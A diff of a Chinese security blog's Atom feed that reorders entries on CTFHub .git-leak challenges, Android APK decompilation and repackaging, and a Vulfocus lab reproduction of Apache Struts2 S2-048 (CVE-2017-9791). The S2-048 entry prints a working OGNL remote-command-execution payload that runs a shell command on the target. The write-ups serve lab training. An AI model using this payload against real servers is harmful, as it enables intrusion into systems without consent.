@@ -92,33 +92,6 @@
   </entry>
   
   <entry>
-    <title>Web基础之信息泄露（下）</title>
-    <link href="https://hzktester.top/2020/08/18/Web%E5%9F%BA%E7%A1%80/CTFHub%E9%A2%98%E8%A7%A3-Web%E5%9F%BA%E7%A1%80%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
-    <id>https://hzktester.top/2020/08/18/Web%E5%9F%BA%E7%A1%80/CTFHub%E9%A2%98%E8%A7%A3-Web%E5%9F%BA%E7%A1%80%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88%E4%B8%8B%EF%BC%89/</id>
-    <published>2020-08-18T07:31:00.000Z</published>
-    <updated>2020-09-20T04:14:22.716Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h2><p>以下需要用到python脚本：Githack<br><a href="https://github.com/BugScanTeam/GitHack">https://github.com/BugScanTeam/GitHack</a></p><h3 id="log"><a href="#log" class="headerlink" title="log"></a>log</h3><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081824.png" alt="image"></p><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>查看历史记录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log</span><br></pre></td></tr></table></figure><p>切换版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset</span><br></pre></td></tr></table></figure><p>对比两次提交</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff</span><br></pre></td></tr></table></figure><h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><ol><li><p>扫描发现 .git 泄露</p><p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081825.png" alt="image"></p></li><li><p>使用 GitHack 工具 clone 目标源代码到本地</p><p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081826.png" alt="image"></p></li><li><p>执行 git log 查看历史记录</p><p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081827.png" alt="image"></p></li><li><p>执行 git show 查看提交详情</p><p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081828.png" alt="image"></p><h3 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a>Stash</h3><h4 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h4><p>git 泄露 .git/refs/stash</p></li></ol><p>stash 用于保存 git 工作状态到 git 栈，在需要的时候再恢复。</p><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><ol><li><p>尝试访问敏感目录，发现.git目录<strong><a href="http://challenge-b48a889fd49f7430.sandbox.ctfhub.com:10080/.git/config">http://challenge-b48a889fd49f7430.sandbox.ctfhub.com:10080/.git/config</a></strong></p></li><li><p>利用GitHack 工具将网站源代码 clone 到本地</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http:&#x2F;&#x2F;challenge-b48a889fd49f7430.sandbox.ctfhub.com:10080&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure><p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081829.png" alt="image"></p></li><li><p>查看 <strong>.git/refs/stash</strong> 找到 <strong>stash</strong> 对应的 <strong>hash</strong></p><p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081830.png" alt="image"></p></li><li><p>git diff 9dbafcb8c4629b4b843991b6ebe5eca874812fc4 得到flag</p><p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081831.png" alt="image"></p></li></ol><h3 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h3><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081832.png" alt="image"></p><h4 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h4><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081833.png" alt="image"><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081834.png" alt="image"></p>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;Git泄露&quot;&gt;&lt;a href=&quot;#Git泄露&quot; class=&quot;headerlink&quot; title=&quot;Git泄露&quot;&gt;&lt;/a&gt;Git泄露&lt;/h2&gt;&lt;p&gt;以下需要用到python脚本：Githack&lt;br&gt;&lt;a href=&quot;https://github.com/BugScanTeam/GitHack&quot;&gt;https://github.com/BugScanTeam/GitHack&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&quot;log&quot;&gt;&lt;a href=&quot;#log&quot; class=&quot;headerlink&quot; title=&quot;log&quot;&gt;&lt;/a&gt;log&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081824.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
-&lt;h4 id=&quot;知识点&quot;&gt;&lt;a href=&quot;#知识点&quot; class=&quot;headerlink&quot; title=&quot;知识点&quot;&gt;&lt;/a&gt;知识点&lt;/h4&gt;&lt;p&gt;查看历史记录&lt;/p&gt;
-&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git log&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;切换版本&lt;/p&gt;
-&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git reset&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;对比两次提交&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="Web基础" scheme="https://hzktester.top/categories/Web%E5%9F%BA%E7%A1%80/"/>
-    
-    
-    <category term="信息泄露" scheme="https://hzktester.top/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
-    
-  </entry>
-  
-  <entry>
     <title>Web基础之信息泄露（上）</title>
     <link href="https://hzktester.top/2020/08/18/Web%E5%9F%BA%E7%A1%80/CTFHub%E9%A2%98%E8%A7%A3-Web%E5%9F%BA%E7%A1%80%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
     <id>https://hzktester.top/2020/08/18/Web%E5%9F%BA%E7%A1%80/CTFHub%E9%A2%98%E8%A7%A3-Web%E5%9F%BA%E7%A1%80%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88%E4%B8%8A%EF%BC%89/</id>
@@ -146,6 +119,57 @@
   </entry>
   
   <entry>
+    <title>Web基础之信息泄露（下）</title>
+    <link href="https://hzktester.top/2020/08/18/Web%E5%9F%BA%E7%A1%80/CTFHub%E9%A2%98%E8%A7%A3-Web%E5%9F%BA%E7%A1%80%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
+    <id>https://hzktester.top/2020/08/18/Web%E5%9F%BA%E7%A1%80/CTFHub%E9%A2%98%E8%A7%A3-Web%E5%9F%BA%E7%A1%80%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88%E4%B8%8B%EF%BC%89/</id>
+    <published>2020-08-18T07:31:00.000Z</published>
+    <updated>2020-09-20T04:14:22.716Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h2><p>以下需要用到python脚本：Githack<br><a href="https://github.com/BugScanTeam/GitHack">https://github.com/BugScanTeam/GitHack</a></p><h3 id="log"><a href="#log" class="headerlink" title="log"></a>log</h3><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081824.png" alt="image"></p><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>查看历史记录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log</span><br></pre></td></tr></table></figure><p>切换版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset</span><br></pre></td></tr></table></figure><p>对比两次提交</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff</span><br></pre></td></tr></table></figure><h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><ol><li><p>扫描发现 .git 泄露</p><p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081825.png" alt="image"></p></li><li><p>使用 GitHack 工具 clone 目标源代码到本地</p><p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081826.png" alt="image"></p></li><li><p>执行 git log 查看历史记录</p><p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081827.png" alt="image"></p></li><li><p>执行 git show 查看提交详情</p><p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081828.png" alt="image"></p><h3 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a>Stash</h3><h4 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h4><p>git 泄露 .git/refs/stash</p></li></ol><p>stash 用于保存 git 工作状态到 git 栈，在需要的时候再恢复。</p><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><ol><li><p>尝试访问敏感目录，发现.git目录<strong><a href="http://challenge-b48a889fd49f7430.sandbox.ctfhub.com:10080/.git/config">http://challenge-b48a889fd49f7430.sandbox.ctfhub.com:10080/.git/config</a></strong></p></li><li><p>利用GitHack 工具将网站源代码 clone 到本地</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http:&#x2F;&#x2F;challenge-b48a889fd49f7430.sandbox.ctfhub.com:10080&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure><p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081829.png" alt="image"></p></li><li><p>查看 <strong>.git/refs/stash</strong> 找到 <strong>stash</strong> 对应的 <strong>hash</strong></p><p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081830.png" alt="image"></p></li><li><p>git diff 9dbafcb8c4629b4b843991b6ebe5eca874812fc4 得到flag</p><p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081831.png" alt="image"></p></li></ol><h3 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h3><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081832.png" alt="image"></p><h4 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h4><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081833.png" alt="image"><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081834.png" alt="image"></p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;Git泄露&quot;&gt;&lt;a href=&quot;#Git泄露&quot; class=&quot;headerlink&quot; title=&quot;Git泄露&quot;&gt;&lt;/a&gt;Git泄露&lt;/h2&gt;&lt;p&gt;以下需要用到python脚本：Githack&lt;br&gt;&lt;a href=&quot;https://github.com/BugScanTeam/GitHack&quot;&gt;https://github.com/BugScanTeam/GitHack&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&quot;log&quot;&gt;&lt;a href=&quot;#log&quot; class=&quot;headerlink&quot; title=&quot;log&quot;&gt;&lt;/a&gt;log&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081824.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
+&lt;h4 id=&quot;知识点&quot;&gt;&lt;a href=&quot;#知识点&quot; class=&quot;headerlink&quot; title=&quot;知识点&quot;&gt;&lt;/a&gt;知识点&lt;/h4&gt;&lt;p&gt;查看历史记录&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git log&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;切换版本&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git reset&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;对比两次提交&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="Web基础" scheme="https://hzktester.top/categories/Web%E5%9F%BA%E7%A1%80/"/>
+    
+    
+    <category term="信息泄露" scheme="https://hzktester.top/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>APP反编译-下载源码</title>
+    <link href="https://hzktester.top/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E5%8F%8D%E7%BC%96%E8%AF%91-%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81/"/>
+    <id>https://hzktester.top/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E5%8F%8D%E7%BC%96%E8%AF%91-%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81/</id>
+    <published>2020-08-16T07:31:00.000Z</published>
+    <updated>2020-09-18T11:41:04.722Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="dex2jar工具"><a href="#dex2jar工具" class="headerlink" title="dex2jar工具"></a>dex2jar工具</h2><ol><li>下载<a href="https://sourceforge.net/projects/dex2jar/">https://sourceforge.net/projects/dex2jar/</a></li><li>解压<strong>dex2jar.jar</strong>文件</li><li>将<strong>shini.apk</strong>文件后缀名修改为.rar然后解压<a id="more"></a></li><li>把解压后目录下的<strong>classes.dex</strong>文件复制到<strong>dex2jar</strong>解压后的文件夹中（<strong>classes.dex</strong>文件与<strong>d2j-dex2jar.bat</strong>文件同在一个目录中）<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081601.png" alt="image"></li><li>进入<strong>dex2jar</strong>目录下执行如下命令会生成<strong>classes-dex2jar.jar</strong>文件<blockquote><p>d2j-dex2jar.bat classes.dex</p></blockquote></li></ol><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081602.png" alt="image"></p><h2 id="jd-gui工具"><a href="#jd-gui工具" class="headerlink" title="jd-gui工具"></a>jd-gui工具</h2><ol><li>下载<a href="https://links.jianshu.com/go?to=http://jd.benow.ca/">https://links.jianshu.com/go?to=http%3A%2F%2Fjd.benow.ca%2F</a></li><li>双击打开<strong>jd-gui</strong>将<strong>classes-dex2jar.jar</strong>文件拖入即可<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081603.png" alt="image"></li><li>点击<strong>File</strong>，然后<strong>Save All Sources</strong>将<strong>class</strong>文件编译为<strong>java</strong>源文件</li></ol>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;dex2jar工具&quot;&gt;&lt;a href=&quot;#dex2jar工具&quot; class=&quot;headerlink&quot; title=&quot;dex2jar工具&quot;&gt;&lt;/a&gt;dex2jar工具&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;下载&lt;a href=&quot;https://sourceforge.net/projects/dex2jar/&quot;&gt;https://sourceforge.net/projects/dex2jar/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;解压&lt;strong&gt;dex2jar.jar&lt;/strong&gt;文件&lt;/li&gt;
+&lt;li&gt;将&lt;strong&gt;shini.apk&lt;/strong&gt;文件后缀名修改为.rar然后解压</summary>
+    
+    
+    
+    <category term="APP渗透" scheme="https://hzktester.top/categories/APP%E6%B8%97%E9%80%8F/"/>
+    
+    
+    <category term="APP反编译" scheme="https://hzktester.top/tags/APP%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
+    
+  </entry>
+  
+  <entry>
     <title>APP之反编译+目录结构+重新打包+重新签名</title>
     <link href="https://hzktester.top/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E4%B9%8B%E5%8F%8D%E7%BC%96%E8%AF%91+%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84+%E9%87%8D%E6%96%B0%E6%89%93%E5%8C%85+%E9%87%8D%E6%96%B0%E7%AD%BE%E5%90%8D/"/>
     <id>https://hzktester.top/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E4%B9%8B%E5%8F%8D%E7%BC%96%E8%AF%91+%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84+%E9%87%8D%E6%96%B0%E6%89%93%E5%8C%85+%E9%87%8D%E6%96%B0%E7%AD%BE%E5%90%8D/</id>
@@ -166,30 +190,6 @@
 &lt;li&gt;重新打包，默认输出&lt;strong&gt;qipai.apk&lt;/strong&gt;文件为当前目录&lt;blockquote&gt;
 &lt;p&gt;apktool b test&lt;/p&gt;
 &lt;/blockquote&gt;</summary>
-    
-    
-    
-    <category term="APP渗透" scheme="https://hzktester.top/categories/APP%E6%B8%97%E9%80%8F/"/>
-    
-    
-    <category term="APP反编译" scheme="https://hzktester.top/tags/APP%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>APP反编译-下载源码</title>
-    <link href="https://hzktester.top/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E5%8F%8D%E7%BC%96%E8%AF%91-%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81/"/>
-    <id>https://hzktester.top/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E5%8F%8D%E7%BC%96%E8%AF%91-%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81/</id>
-    <published>2020-08-16T07:31:00.000Z</published>
-    <updated>2020-09-18T11:41:04.722Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="dex2jar工具"><a href="#dex2jar工具" class="headerlink" title="dex2jar工具"></a>dex2jar工具</h2><ol><li>下载<a href="https://sourceforge.net/projects/dex2jar/">https://sourceforge.net/projects/dex2jar/</a></li><li>解压<strong>dex2jar.jar</strong>文件</li><li>将<strong>shini.apk</strong>文件后缀名修改为.rar然后解压<a id="more"></a></li><li>把解压后目录下的<strong>classes.dex</strong>文件复制到<strong>dex2jar</strong>解压后的文件夹中（<strong>classes.dex</strong>文件与<strong>d2j-dex2jar.bat</strong>文件同在一个目录中）<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081601.png" alt="image"></li><li>进入<strong>dex2jar</strong>目录下执行如下命令会生成<strong>classes-dex2jar.jar</strong>文件<blockquote><p>d2j-dex2jar.bat classes.dex</p></blockquote></li></ol><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081602.png" alt="image"></p><h2 id="jd-gui工具"><a href="#jd-gui工具" class="headerlink" title="jd-gui工具"></a>jd-gui工具</h2><ol><li>下载<a href="https://links.jianshu.com/go?to=http://jd.benow.ca/">https://links.jianshu.com/go?to=http%3A%2F%2Fjd.benow.ca%2F</a></li><li>双击打开<strong>jd-gui</strong>将<strong>classes-dex2jar.jar</strong>文件拖入即可<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081603.png" alt="image"></li><li>点击<strong>File</strong>，然后<strong>Save All Sources</strong>将<strong>class</strong>文件编译为<strong>java</strong>源文件</li></ol>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;dex2jar工具&quot;&gt;&lt;a href=&quot;#dex2jar工具&quot; class=&quot;headerlink&quot; title=&quot;dex2jar工具&quot;&gt;&lt;/a&gt;dex2jar工具&lt;/h2&gt;&lt;ol&gt;
-&lt;li&gt;下载&lt;a href=&quot;https://sourceforge.net/projects/dex2jar/&quot;&gt;https://sourceforge.net/projects/dex2jar/&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;解压&lt;strong&gt;dex2jar.jar&lt;/strong&gt;文件&lt;/li&gt;
-&lt;li&gt;将&lt;strong&gt;shini.apk&lt;/strong&gt;文件后缀名修改为.rar然后解压</summary>
     
     
     
@@ -270,6 +270,28 @@
   </entry>
   
   <entry>
+    <title>S2-048 CVE-2017-9791复现过程</title>
+    <link href="https://hzktester.top/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-048%20CVE-2017-9791%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
+    <id>https://hzktester.top/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-048%20CVE-2017-9791%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
+    <published>2020-08-14T07:31:00.000Z</published>
+    <updated>2020-09-21T12:03:45.189Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本</p><a id="more"></a><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li><p>使用vulfocus启动漏洞环境，选择Integration中的Struts 1 Integration<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081407.png" alt="image"></p></li><li><p>随意输入内容，使用burp抓取“submit”的数据包</p></li><li><p>poc利用</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#_&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;id&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081408.png" alt="image"></p><p>或直接使用工具<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081409.png" alt="image"></p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限&lt;/p&gt;
+&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="vulfocus靶场练习" scheme="https://hzktester.top/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
+    
+    
+    <category term="Struts2" scheme="https://hzktester.top/tags/Struts2/"/>
+    
+  </entry>
+  
+  <entry>
     <title>S2-046 CVE-2017-5638复现过程</title>
     <link href="https://hzktester.top/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-046%20CVE-2017-5638%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
     <id>https://hzktester.top/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-046%20CVE-2017-5638%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
@@ -292,17 +314,17 @@
   </entry>
   
   <entry>
-    <title>S2-048 CVE-2017-9791复现过程</title>
-    <link href="https://hzktester.top/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-048%20CVE-2017-9791%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>https://hzktester.top/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-048%20CVE-2017-9791%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
+    <title>S2-053 CVE-2017-12611复现过程</title>
+    <link href="https://hzktester.top/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-053%20CVE-2017-12611%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
+    <id>https://hzktester.top/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-053%20CVE-2017-12611%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
     <published>2020-08-14T07:31:00.000Z</published>
-    <updated>2020-09-21T12:03:45.189Z</updated>
+    <updated>2020-09-21T12:03:39.062Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本</p><a id="more"></a><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li><p>使用vulfocus启动漏洞环境，选择Integration中的Struts 1 Integration<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081407.png" alt="image"></p></li><li><p>随意输入内容，使用burp抓取“submit”的数据包</p></li><li><p>poc利用</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#_&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;id&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new 